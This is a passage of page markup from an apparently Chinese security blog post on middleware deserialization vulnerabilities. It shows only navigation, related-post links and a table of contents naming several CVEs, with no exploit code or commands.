class="anzhiyufont anzhiyu-icon-tag"></i></span>中间件<span class="tagsPageCount">15</span></a><a class="post-meta__box__tags" href="/tags/java/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>反序列化<span class="tagsPageCount">4</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/AI%20Infra%20feature%20image-1.png?x-oss-process=style/img-to-webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/8399/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/zentao_logo.png?x-oss-process=style/img-to-webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">禅道漏洞</div></div></a></div><div class="next-post pull-right"><a href="/posts/5304/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">域横向移动工具对比</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/62533/" title="Confluence-CVE-2022-26134"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Confluence-CVE-2022-26134</div></div></a></div><div><a href="/posts/6124/" title="ColdFusion-CVE-2017-3066"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">ColdFusion-CVE-2017-3066</div></div></a></div><div><a href="/posts/19496/" title="GitLab-CVE-2021-22205"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">GitLab-CVE-2021-22205</div></div></a></div><div><a href="/posts/18454/" title="Nginx常见安全漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-27</div><div class="title">Nginx常见安全漏洞</div></div></a></div><div><a href="/posts/25650/" title="Spring Cloud-CVE-2022-22947"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Spring Cloud-CVE-2022-22947</div></div></a></div><div><a href="/posts/42518/" title="Kibana-CVE-2019-7609"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Kibana-CVE-2019-7609</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">常见漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">1. 反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IIOP-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2. IIOP&#x2F;T3协议反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">3. 未经身份验证的远程代码执行（RCE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">4. 服务器端请求伪造（SSRF）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">5. 权限提升漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">6. 管理控制台漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">7. 第三方库漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%85%B6%E4%BB%96%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">8. 其他高危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.9.</span> <span class="toc-text">缓解建议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-number"></span> <span class="toc-text">漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-CVE-2017-3506"><span class="toc-number">1.</span> <span class="toc-text">1.CVE-2017-3506</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.0.1.</span> <span class="toc-text">1. 漏洞背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">2. 漏洞触发原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">核心代码流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%81%B6%E6%84%8F-XML-%E6%9E%84%E9%80%A0"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">恶意 XML 构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%A6%81%E7%82%B9"><span class="toc-number">1.0.3.</span> <span class="toc-text">3. 代码审计要点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">审计关键点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">漏洞调用链分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E5%AE%A1%E8%AE%A1%E9%AA%8C%E8%AF%81"><span class="toc-number">1.0.4.</span> <span class="toc-text">4. 修复方案与审计验证</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E9%AA%8C%E8%AF%81"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">修复验证</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%A1%E8%AE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.0.5.</span> <span class="toc-text">5. 总结与审计建议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CVE-2017-10271"><span class="toc-number">2.</span> <span class="toc-text">2.CVE-2017-10271</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">2.0.1.</span> <span class="toc-text">一、漏洞背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">二、漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">1. 漏洞触发流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%E9%80%BB%E8%BE%91"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">2. 补丁绕过逻辑</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.0.3.</span> <span class="toc-text">三、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">1. 环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">2. 漏洞验证与利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.0.3.3.</span> <span class="toc-text">3. 自动化工具利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84-URL-%E5%88%97%E8%A1%A8"><span class="toc-number">2.0.4.</span> <span class="toc-text">二、可利用的 URL 列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.0.5.</span> <span class="toc-text">三、注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CVE-2019-2725"><span class="toc-number">3.</span> <span class="toc-text">3.CVE-2019-2725</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">1. 漏洞背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.2.</span> <span class="toc-text">2. 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">3.0.2.1.</span> <span class="toc-text">(1) 核心触发流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%E6%9C%BA%E5%88%B6"><span class="toc-number">3.0.2.2.</span> <span class="toc-text">(2) 补丁绕过机制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%A6%81%E7%82%B9-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">3. 代码审计要点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"><span class="toc-number">3.0.3.1.</span> <span class="toc-text">(1) 反序列化入口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%A1%A5%E4%B8%81%E9%AA%8C%E8%AF%81"><span class="toc-number">3.0.3.2.</span> <span class="toc-text">(2) 补丁验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.0.3.3.</span> <span class="toc-text">(3) 利用链分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.0.4.</span> <span class="toc-text">4. 漏洞修复建议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93"><span class="toc-number">3.0.5.</span> <span class="toc-text">5. 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CVE-2018-2628"><span class="toc-number">3.1.</span> <span class="toc-text">4.CVE-2018-2628</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">一、漏洞背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.2.</span> <span class="toc-text">二、漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">1. 触发机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">2. 漏洞利用链</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%A6%81%E7%82%B9"><span class="toc-number">3.1.3.</span> <span class="toc-text">三、代码审计要点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AE%A1%E8%AE%A1%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">1. 审计关键路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%A1%A5%E4%B8%81%E6%9C%89%E6%95%88%E6%80%A7%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">2. 补丁有效性验证</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.4.</span> <span class="toc-text">四、漏洞利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">一、环境准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.4.2.</span> <span class="toc-text">二、漏洞检测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.4.3.</span> <span class="toc-text">三、攻击流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.5.</span> <span class="toc-text">五、攻击阶段流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.5.1.</span> <span class="toc-text">阶段 1：触发反序列化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9AJRMP-%E5%8D%8F%E8%AE%AE%E4%BA%A4%E4%BA%92"><span class="toc-number">3.1.5.2.</span> <span class="toc-text">阶段 2：JRMP 协议交互</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.5.3.</span> <span class="toc-text">阶段 3：执行恶意代码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BC%93%E8%A7%A3"><span class="toc-number">3.1.6.</span> <span class="toc-text">六、漏洞修复与缓解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">3.1.7.</span> <span class="toc-text">七、总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-CVE-2020-2883"><span class="toc-number">3.2.</span> <span class="toc-text">5.CVE-2020-2883</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">1. 漏洞背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.2.</span> <span class="toc-text">2. 漏洞核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">(1) 反序列化入口点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88Gadget-Chain%EF%BC%89"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">(2) 漏洞利用链（Gadget Chain）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E8%A1%A5%E4%B8%81%E6%9C%BA%E5%88%B6"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">(3) 绕过补丁机制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.3.</span> <span class="toc-text">3. 漏洞触发流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.4.</span> <span class="toc-text">4. 关键代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3-1"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">(1) 反序列化入口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">(2) 利用链构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.4.3.</span> <span class="toc-text">(3) 命令执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%A1%A5%E4%B8%81%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">3.2.5.</span> <span class="toc-text">5. 补丁与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">(1) 官方补丁</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">3.2.5.2.</span> <span class="toc-text">(2) 缓解措施</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.6.</span> <span class="toc-text">6.漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89-PoC"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">（1） PoC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.6.2.</span> <span class="toc-text">（2）利用命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.7.</span> <span class="toc-text">7. 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-CVE-2020-2551"><span class="toc-number">3.3.</span> <span class="toc-text">6.CVE-2020-2551</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.3.1.</span> <span class="toc-text">1. 漏洞背景与影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">2. 漏洞核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E7%82%B9-1"><span class="toc-number">3.3.2.1.</span> 